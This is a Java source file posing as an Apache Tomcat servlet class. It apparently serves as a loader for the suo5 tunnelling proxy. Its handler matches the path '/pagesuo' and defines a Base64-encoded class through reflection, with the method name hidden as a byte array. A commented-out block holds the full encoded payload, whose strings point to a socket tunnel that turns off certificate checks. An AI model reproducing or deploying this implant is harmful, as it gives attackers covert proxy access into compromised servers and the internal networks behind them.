package org.apache.catalina.servlets.sl;



public class Suo5 {
    private static final String pathPattern= "/pagesuo";

    public static Class loader(byte[] bytes) throws Exception {
        java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[0], Thread.currentThread().getContextClassLoader());
        java.lang.reflect.Method method = ClassLoader.class.getDeclaredMethod(new String(new byte[]{100,101,102,105,110,101,67,108,97,115,115}), new Class[]{byte[].class, int.class, int.class});
        method.setAccessible(true);
        Class clazz = (Class) method.invoke(classLoader, new Object[]{bytes, new Integer(0), new Integer(bytes.length)});
        return clazz;
    }

    public static void doService(Object obj, String url, String method, java.io.InputStream in) {
        if (url.matches(pathPattern)) {
            java.util.Map objMap = (java.util.Map) obj;
            Object request = objMap.get("request");
            Object response = objMap.get("response");

            Object[] args = new Object[]{
                    request,
                    response
            };

            try {
                java.net.URLClassLoader loader = new java.net.URLClassLoader(new java.net.URL[0], Thread.currentThread().getContextClassLoader());
                String clazzBase64 = "";
                byte[] clazzByte;
                try {
                    Class Base64 = loader.loadClass("sun.misc.BASE64Decoder");
                    Object Decoder = Base64.newInstance();
                    clazzByte=(byte[]) Decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(Decoder, new Object[]{(clazzBase64)});
                } catch (Throwable ex)
                {
                    Class Base64 = loader.loadClass("java.util.Base64");
                    Object Decoder = Base64.getDeclaredMethod("getDecoder",new Class[0]).invoke(null, new Object[0]);
                    clazzByte=(byte[])Decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(Decoder, new Object[]{clazzBase64});
                }

                Class clazz = loader(clazzByte);
                clazz.newInstance().equals(args);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

//    public static void main(String[] args) {
//        String classname = "vsuosystem.class";
//        byte[] code = new byte[0];
//        try {
//            code = java.nio.file.Files.readAllBytes(java.nio.file.Paths.get("/Users/joker/IdeaProjects/veo/vagent/src/main/java/com/sf/classs/"+classname));
//            System.out.println(java.util.Arrays.toString(code));
//            String b64bytecode = new String(org.apache.tomcat.util.codec.binary.Base64.encodeBase64(code));
//            String result = java.net.URLEncoder.encode(b64bytecode, "UTF-8");
//            System.out.println(result);
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
//
//        ClassLoader loader = Suo5.class.getClassLoader();
//        String clazzBase64 = "yv66vgAAADECGgoABgD4CQBqAPkJAGoA+gcA+wgA/AcA/QgA/goAagD/BwEACAEBCAECCgAJAQMKAGoBBAgBBQoAagEGCgBqAQcHAQgHAQkKABIBCgcBCwoAFAD4CgAUAQwKAB0BDQoAHQEOBQAAAAAAAADICgBsAQ8IARAHAREKAGoBEggBEwcBFAoAIAEVCgAgARYHARcKACMA+AgBGAoAIwEZCAEaCAEbBwEcBwEdCgAqAPgKACoBHggBHwoAKgEgCgAqASEKACkBIgoBIwEkBwElCgAyAPgKACMBJgsBJwEoCgAjASkHASoKAAkBKwoAMgEsCgAJAS0KADIBFQoAagEuCgAyAS8KATABMQoBMAEyCgEwATMKATABNAoBMAE1BwE2CgBDATcKAEMBOAoBMAE5CgEwAToKATABOwMCAAAABwE8CAE9CgBKASIIAT4KABIBIgoAagE/CgAJAUAIAUEKAGoBQggBQwcBRAoAVAE3CgBqAUUIAUYKAJwBRwgBSAgBSQgBSggBSwgBTAgBTQoAnAFOBwFPCgBgAPgHAVAKAGIBUQoAYAFSCgBqAVMKAGoBVAoAIAFVCgBgAVYKAGABVwcBWAoAagFZBwFaCgBsAVsKAGwBXAoAagFdCgBgAVUKAGwBXgoAHQFfCgBqAWAIAWEIAWIIAWMKACMBZAoAagFlCgBqAWYKAJcBZwgBaAoABgFpCAFqBwFrCgB+AWwKAW0BbgoAagFvCgCXAVcIAXAIAXEKAGoBcgoAiQFzCwCrAXQLAKsBdQcBdgoAiQF3BwF4CgCLAXkKAAkBegoACQF7CQF8AX0HAX4KAJABIgoAkAF/CQBqAYAKACMBgQgBggoAkAGDBwGECgCXAYUIAYYJAJwBhwoAfgGIBwGJCgCcAYoIAYsKAJcBjAoAlwGNBwGOCgB+AY8KAKEBkAgBkQoBkgGTBwGUCgGSAZUKAZIBlgoAoQGXCAGYBwGZCgCXAZoKAJcBVgoAlwGbBwGcCgB+AZ0HAZ4JALEBhwcBnwkAswGHCgBqAaAKAW0BoQoBbQGiCgBqAaMHAaQHAaUHAaYBAAVhZGRycwEAE0xqYXZhL3V0aWwvSGFzaE1hcDsBAAlnSW5TdHJlYW0BABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAApnT3V0U3RyZWFtAQAWTGphdmEvaW8vT3V0cHV0U3RyZWFtOwEABjxpbml0PgEALihMamF2YS9pby9JbnB1dFN0cmVhbTtMamF2YS9pby9PdXRwdXRTdHJlYW07KVYBAARDb2RlAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAacmVhZElucHV0U3RyZWFtV2l0aFRpbWVvdXQBABsoTGphdmEvaW8vSW5wdXRTdHJlYW07W0JJKVYBAApFeGNlcHRpb25zBwGnAQANdHJ5RnVsbER1cGxleAEAJyhMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspVgEACW5ld0NyZWF0ZQEAFihCKUxqYXZhL3V0aWwvSGFzaE1hcDsBAAduZXdEYXRhAQAXKFtCKUxqYXZhL3V0aWwvSGFzaE1hcDsBAAZuZXdEZWwBABUoKUxqYXZhL3V0aWwvSGFzaE1hcDsBAAluZXdTdGF0dXMBAAp1MzJ0b0J5dGVzAQAFKEkpW0IBAApieXRlc1RvVTMyAQAFKFtCKUkBAAtjb3B5T2ZSYW5nZQEACChbQklJKVtCAQAHbWFyc2hhbAEAFyhMamF2YS91dGlsL0hhc2hNYXA7KVtCAQAJdW5tYXJzaGFsAQAqKExqYXZhL2lvL0lucHV0U3RyZWFtOylMamF2YS91dGlsL0hhc2hNYXA7AQAOcHJvY2Vzc0RhdGFCaW8BAApyZWFkU29ja2V0AQAvKExqYXZhL2lvL0lucHV0U3RyZWFtO0xqYXZhL2lvL091dHB1dFN0cmVhbTtaKVYBAAdyZWFkUmVxAQA2KExqYXZhL2lvL0J1ZmZlcmVkSW5wdXRTdHJlYW07TGphdmEvaW8vT3V0cHV0U3RyZWFtOylWAQAQcHJvY2Vzc0RhdGFVbmFyeQEAA3J1bgEAAygpVgEAC2NvbGxlY3RBZGRyAQALaXNMb2NhbEFkZHIBABUoTGphdmEvbGFuZy9TdHJpbmc7KVoBAAhyZWRpcmVjdAEAVShMamF2YS9sYW5nL09iamVjdDtMamF2YS91dGlsL0hhc2hNYXA7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL25ldC9IdHRwVVJMQ29ubmVjdGlvbjsBAAZ2ZXJpZnkBAC8oTGphdmEvbGFuZy9TdHJpbmc7TGphdmF4L25ldC9zc2wvU1NMU2Vzc2lvbjspWgEAEmNoZWNrQ2xpZW50VHJ1c3RlZAEAOihbTGphdmEvc2VjdXJpdHkvY2VydC9YNTA5Q2VydGlmaWNhdGU7TGphdmEvbGFuZy9TdHJpbmc7KVYHAagBABJjaGVja1NlcnZlclRydXN0ZWQBABJnZXRBY2NlcHRlZElzc3VlcnMBACcoKVtMamF2YS9zZWN1cml0eS9jZXJ0L1g1MDlDZXJ0aWZpY2F0ZTsBAAxpbnZva2VNZXRob2QBAEsoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAA1pbnZva2VNZXRob2QyAQBdKExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzO1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAIPGNsaW5pdD4MAMIA5QwAvgC/DADAAMEBABNbTGphdmEvbGFuZy9PYmplY3Q7AQAJZ2V0SGVhZGVyAQAQamF2YS9sYW5nL09iamVjdAEAClVzZXItQWdlbnQMAPMA9AEAEGphdmEvbGFuZy9TdHJpbmcBAAxDb250ZW50LVR5cGUBABFhcHBsaWNhdGlvbi9wbGFpbgwAxQDGDADLAMwBABhhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0MAN4AzAwA4wDMAQATamF2YS9sYW5nL1Rocm93YWJsZQEAE2phdmEvbGFuZy9FeGNlcHRpb24MAakA5QEADmphdmEvdXRpbC9EYXRlDAGqAasMAawBrQwBrgGvDAGwAbEBAA5nZXRJbnB1dFN0cmVhbQEAE2phdmEvaW8vSW5wdXRTdHJlYW0MAMcAyAEAD2dldE91dHB1dFN0cmVhbQEAFGphdmEvaW8vT3V0cHV0U3RyZWFtDAGyAbMMAbQA5QEAEWphdmEvdXRpbC9IYXNoTWFwAQACYWMMAbUBtgEAAXMBAAJkdAEAImphdmEvbGFuZy9JbGxlZ2FsQXJndW1lbnRFeGNlcHRpb24BABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwBtwG4AQADID4gDAG3AbkMAboBuwwAwgG8BwG9DAG+Ab8BAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQwBwAHBBwHCDAHDAcQMAcUBxgEAAltCDAHHAa0MAbIByAwByQHKDADUANUMAcsBygcBzAwBzQHODAHPAc4MAbUB0AwBtQHRDAHSAcoBABdqYXZhL2lvL0RhdGFJbnB1dFN0cmVhbQwAwgHTDAHUAbMMAdUB0QwB1gGtDAHFAdcBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQALaW52YWxpZCBsZW4BAA1rZXkgbGVuIGVycm9yDADYANkMAMIBswEAD3ZhbHVlIGxlbiBlcnJvcgwA1gDXAQALdmFsdWUgZXJyb3IBABtqYXZhL2lvL0J1ZmZlcmVkSW5wdXRTdHJlYW0MANwA3QEACXNldFN0YXR1cwwB2AHZAQANc2V0QnVmZmVyU2l6ZQEACXNldEhlYWRlcgEAEVgtQWNjZWwtQnVmZmVyaW5nAQACbm8BAAFoAQABcAwB2gHbAQAPamF2YS9uZXQvU29ja2V0AQAaamF2YS9uZXQvSW5ldFNvY2tldEFkZHJlc3MMAMIB3AwB3QHeDADTAM4MANoA2wwB3wDlDAETAeAMARAB4QEACnZzdW9zeXN0ZW0MAMIAwwEAEGphdmEvbGFuZy9UaHJlYWQMAMIB4gwB4wDlDADhAOIMAeQA5QwBrgDXDADPANABAAJpZAEAAXIBAAAMAeUBxgwA5wDoDADpAOoMAeYA5QEAEWdldFNlcnZsZXRDb250ZXh0DAHnAegBAAxnZXRBdHRyaWJ1dGUBAA9qYXZhL2xhbmcvQ2xhc3MMAekB6gcB6wwB7AHtDADRANIBAAxzZXRBdHRyaWJ1dGUBAA9yZW1vdmVBdHRyaWJ1dGUMAN8A4AwB7gHvDAHwAfEMAfIB8wEAGWphdmEvbmV0L05ldHdvcmtJbnRlcmZhY2UMAfQB7wEAFGphdmEvbmV0L0luZXRBZGRyZXNzDAH1AbsMAfYB9wwB+AH5BwH6DAH7AfwBAAxqYXZhL25ldC9VUkwMAf0BuwwAvAC9DAH+AMYBAAlnZXRNZXRob2QMAf8CAAEAGmphdmEvbmV0L0h0dHBVUkxDb25uZWN0aW9uDAIBAbwBABFzZXRDb25uZWN0VGltZW91dAwCAgIDDAGCAeoBABFqYXZhL2xhbmcvSW50ZWdlcgwAwgHIAQAOc2V0UmVhZFRpbWVvdXQMAgQCBQwCBgIFAQAgamF2YXgvbmV0L3NzbC9IdHRwc1VSTENvbm5lY3Rpb24MAgcAxgwCCAIJAQADU1NMBwIKDAILAgwBABpqYXZheC9uZXQvc3NsL1RydXN0TWFuYWdlcgwCDQIODAIPAhAMAhECEgEADmdldEhlYWRlck5hbWVzAQAVamF2YS91dGlsL0VudW1lcmF0aW9uDAITAhQMAhUBrQEAImphdmEvc2VjdXJpdHkvY2VydC9YNTA5Q2VydGlmaWNhdGUMAhYCFwEADmphdmEvbGFuZy9Mb25nAQAPamF2YS9sYW5nL1Nob3J0DAD1APYMAhgB8QwCGQIFDADmANIBABJqYXZhL2xhbmcvUnVubmFibGUBAB5qYXZheC9uZXQvc3NsL0hvc3RuYW1lVmVyaWZpZXIBAB5qYXZheC9uZXQvc3NsL1g1MDlUcnVzdE1hbmFnZXIBAB5qYXZhL2xhbmcvSW50ZXJydXB0ZWRFeGNlcHRpb24BACdqYXZhL3NlY3VyaXR5L2NlcnQvQ2VydGlmaWNhdGVFeGNlcHRpb24BAA9wcmludFN0YWNrVHJhY2UBAAdnZXRUaW1lAQADKClKAQAJYXZhaWxhYmxlAQADKClJAQAEcmVhZAEAByhbQklJKUkBAAVzbGVlcAEABChKKVYBAAV3cml0ZQEABShbQilWAQAFZmx1c2gBAANwdXQBADgoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEABmFwcGVuZAEAHChJKUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAOamF2YS9sYW5nL01hdGgBAANtaW4BAAUoSUkpSQEABmtleVNldAEAESgpTGphdmEvdXRpbC9TZXQ7AQANamF2YS91dGlsL1NldAEAB3RvQXJyYXkBABUoKVtMamF2YS9sYW5nL09iamVjdDsBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEABmxlbmd0aAEABChJKVYBAAhnZXRCeXRlcwEABCgpW0IBAAt0b0J5dGVBcnJheQEAE2phdmEvbmlvL0J5dGVCdWZmZXIBAAhhbGxvY2F0ZQEAGChJKUxqYXZhL25pby9CeXRlQnVmZmVyOwEABnB1dEludAEAGChCKUxqYXZhL25pby9CeXRlQnVmZmVyOwEAGShbQilMamF2YS9uaW8vQnl0ZUJ1ZmZlcjsBAAVhcnJheQEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEACXJlYWRGdWxseQEABHdyYXABAAZnZXRJbnQBAAMoKUIBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwEACHBhcnNlSW50AQAVKExqYXZhL2xhbmcvU3RyaW5nOylJAQAWKExqYXZhL2xhbmcvU3RyaW5nO0kpVgEAB2Nvbm5lY3QBABwoTGphdmEvbmV0L1NvY2tldEFkZHJlc3M7SSlWAQAFY2xvc2UBABgoKUxqYXZhL2lvL091dHB1dFN0cmVhbTsBABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAFyhMamF2YS9sYW5nL1J1bm5hYmxlOylWAQAFc3RhcnQBAARqb2luAQAGcmVtb3ZlAQAKZGlzY29ubmVjdAEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAFGdldE5ldHdvcmtJbnRlcmZhY2VzAQAZKClMamF2YS91dGlsL0VudW1lcmF0aW9uOwEAD2hhc01vcmVFbGVtZW50cwEAAygpWgEAC25leHRFbGVtZW50AQAUKClMamF2YS9sYW5nL09iamVjdDsBABBnZXRJbmV0QWRkcmVzc2VzAQAOZ2V0SG9zdEFkZHJlc3MBAAdpbmRleE9mAQAEKEkpSQEACXN1YnN0cmluZwEAFihJSSlMamF2YS9sYW5nL1N0cmluZzsBABFqYXZhL2xhbmcvQm9vbGVhbgEABFRSVUUBABNMamF2YS9sYW5nL0Jvb2xlYW47AQAHZ2V0SG9zdAEAC2NvbnRhaW5zS2V5AQAOb3BlbkNvbm5lY3Rpb24BABooKUxqYXZhL25ldC9VUkxDb25uZWN0aW9uOwEAEHNldFJlcXVlc3RNZXRob2QBAARUWVBFAQARTGphdmEvbGFuZy9DbGFzczsBAAtzZXREb091dHB1dAEABChaKVYBAApzZXREb0lucHV0AQAKaXNJbnN0YW5jZQEAE3NldEhvc3RuYW1lVmVyaWZpZXIBACMoTGphdmF4L25ldC9zc2wvSG9zdG5hbWVWZXJpZmllcjspVgEAGGphdmF4L25ldC9zc2wvU1NMQ29udGV4dAEAC2dldEluc3RhbmNlAQAuKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvbmV0L3NzbC9TU0xDb250ZXh0OwEABGluaXQBAFcoW0xqYXZheC9uZXQvc3NsL0tleU1hbmFnZXI7W0xqYXZheC9uZXQvc3NsL1RydXN0TWFuYWdlcjtMamF2YS9zZWN1cml0eS9TZWN1cmVSYW5kb207KVYBABBnZXRTb2NrZXRGYWN0b3J5AQAiKClMamF2YXgvbmV0L3NzbC9TU0xTb2NrZXRGYWN0b3J5OwEAE3NldFNTTFNvY2tldEZhY3RvcnkBACMoTGphdmF4L25ldC9zc2wvU1NMU29ja2V0RmFjdG9yeTspVgEAEnNldFJlcXVlc3RQcm9wZXJ0eQEAJyhMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZzspVgEAD2dldFJlc3BvbnNlQ29kZQEAEGlzQXNzaWduYWJsZUZyb20BABQoTGphdmEvbGFuZy9DbGFzczspWgEADGlzQWNjZXNzaWJsZQEADXNldEFjY2Vzc2libGUAIQBqAAYAAwC5ALoAuwADAAgAvAC9AAAAAAC+AL8AAAAAAMAAwQAAABwAAQDCAMMAAQDEAAAAGwACAAMAAAAPKrcAASortQACKiy1AAOxAAAAAAABAMUAxgABAMQAAACzAAYACAAAAH8rwAAEwAAETSwDMk4sBDI6BC0SBQS9AAZZAxIHU7gACMAA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";
//        byte[] clazzByte;
//        try {
//            try {
//                Class Base64 = loader.loadClass("sun.misc.BASE64Decoder");
//                Object Decoder = Base64.newInstance();
//                clazzByte=(byte[]) Decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(Decoder, new Object[]{(clazzBase64)});
//            } catch (Throwable ex)
//            {
//                Class Base64 = loader.loadClass("java.util.Base64");
//                Object Decoder = Base64.getDeclaredMethod("getDecoder",new Class[0]).invoke(null, new Object[0]);
//                clazzByte=(byte[])Decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(Decoder, new Object[]{clazzBase64});
//            }
//
//            System.out.println(java.util.Arrays.toString(clazzByte));
//        }catch (Exception e) {
//            e.printStackTrace();
//        }
//    }
}
